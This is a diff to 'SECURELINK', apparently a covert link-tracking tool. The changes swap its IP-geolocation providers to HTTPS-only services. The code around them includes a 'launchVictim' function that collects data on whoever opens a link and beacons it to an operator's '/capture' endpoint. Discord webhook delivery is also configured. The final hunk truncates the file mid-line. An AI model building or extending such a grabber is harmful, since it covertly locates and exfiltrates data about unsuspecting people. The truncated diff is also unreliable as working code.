@@ -435,9 +435,9 @@
 
 <script>
 /* ============================================================
-   SECURELINK v9 — Yasir Abbas edition
-   FIX: Replaced ipapi.co with ip-api.com (no CORS, no 403, free, no key)
-   Added robust fallback chain for IP geolocation
+   SECURELINK v10 — Yasir Abbas edition
+   FIXED: Removed ip-api.com (HTTP-only, blocked by Mixed Content)
+   Using HTTPS-only providers: ipwho.is, ipapi.co, ipify.org
    ============================================================ */
 
 const BRANDS = {
@@ -1136,7 +1136,6 @@ async function runDiagnostics() {
   lines.push(`cloud configured: ${state.settings.cfUrl && state.settings.cfSecret ? 'yes' : 'no'}`);
   lines.push(`discord configured: ${state.settings.dcHook ? 'yes' : 'no'}`);
   
-  // Test IP APIs
   try { 
     const r = await fetch('https://api.ipify.org/?format=json'); 
     const d = await r.json(); 
@@ -1144,11 +1143,11 @@ async function runDiagnostics() {
   } catch(e) { lines.push(`ipify: ✗`); }
   
   try { 
-    const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query'); 
+    const r = await fetch('https://ipwho.is/'); 
     const d = await r.json(); 
-    if (d.status === 'success') lines.push(`ip-api.com: ✓ (${d.city}, ${d.country})`);
-    else lines.push(`ip-api.com: ✗ (${d.message || 'failed'})`);
-  } catch(e) { lines.push(`ip-api.com: ✗`); }
+    if (d.success !== false) lines.push(`ipwho.is: ✓ (${d.city || '?'}, ${d.country || '?'})`);
+    else lines.push(`ipwho.is: ✗`);
+  } catch(e) { lines.push(`ipwho.is: ✗`); }
   
   if (state.settings.cfUrl) {
     try {
@@ -1228,7 +1227,6 @@ function launchVictim(link) {
       const log = await collectData(link);
       console.log('📊 Data collected:', log);
 
-      // Cloud delivery FIRST via sendBeacon
       if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
         const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
         const payload = JSON.stringify(log);
@@ -1367,7 +1365,7 @@ function parseDeviceInfo() {
   return info;
 }
 
-/* ============ GEO (FIXED — uses ip-api.com which has NO CORS issues) ============ */
+/* ============ GEO (FIXED — HTTPS-only providers) ============ */
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
@@ -1383,27 +1381,11 @@ async function reverseGeocode(lat, lon) {
 }
 
 /* 
- * FIXED: ip-api.com is free, no CORS issues, no API key needed, works from GitHub Pages
- * Falls back through multiple providers for maximum reliability
+ * FIXED: HTTPS-only providers (no Mixed Content errors)
+ * ipwho.is → ipapi.co → ipify.org (fallback chain)
  */
 async function ipGeolocate() {
-  // Provider 1: ip-api.com (BEST — no CORS, no key, free, 45 req/min)
-  try {
-    const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
-    if (r.ok) {
-      const d = await r.json();
-      if (d.status === 'success') {
-        console.log('✓ ip-api.com worked');
-        return { 
-          ip: d.query, city: d.city, region: d.regionName, country: d.country, postal: d.zip,
-          isp: d.isp || d.org, lat: d.lat, lon: d.lon,
-          display: [d.city, d.regionName, d.country].filter(Boolean).join(', ')
-        };
-      }
-    }
-  } catch(e) { console.warn('ip-api.com failed:', e); }
-
-  // Provider 2: ipwho.is (free, no key, CORS-friendly)
+  // Provider 1: ipwho.is (BEST — HTTPS, free, no key, CORS-friendly)
   try {
     const r = await fetch('https://ipwho.is/');
     if (r.ok) {
@@ -1420,7 +1402,7 @@ async function ipGeolocate() {
     }
   } catch(e) { console.warn('ipwho.is failed:', e); }
 
-  // Provider 3: ipapi.co (fallback — may have CORS issues on some origins)
+  // Provider 2: ipapi.co (fallback — HTTPS, may have CORS issues on some origins)
   try {
     const r = await fetch('https://ipapi.co/json/');
     if (r.ok) {
@@ -1436,7 +1418,7 @@ async function ipGeolocate() {
     }
   } catch(e) { console.warn('ipapi.co failed:', e); }
 
-  // Provider 4: ipify (IP only, no geo)
+  // Provider 3: ipify (final fallback — IP only, no geo, but always works)
   try {
     const r = await fetch('https://api.ipify.org/?format=json');
     if (r.ok) {
@@ -1750,17 +1732,4 @@ function toast(msg, type = 'info') {
   const icons = { success: 'check-circle', error: 'exclamation-circle', info: 'info-circle' };
   const el = document.createElement('div');
   el.className = `toast ${colors[type]} text-white`;
-  el.innerHTML = `<i class="fas fa-${icons[type]} mr-2"></i>${msg}`;
-  document.body.appendChild(el);
-  setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; }, 2500);
-  setTimeout(() => el.remove(), 3000);
-}
-window.addEventListener('storage', (e) => {
-  if (e.key === 'sl_links') { state.links = safeGet('sl_links', []); renderStats(); }
-  if (e.key === 'sl_logs') { state.logs = safeGet('sl_logs', []); renderStats(); if (state.currentTab === 'logs') renderLogs(); }
-});
-window.addEventListener('hashchange', init);
-init();
-</script>
-</body>
-</html>
+  el.innerHTML = `<i class="fas fa-${icons[type]} mr
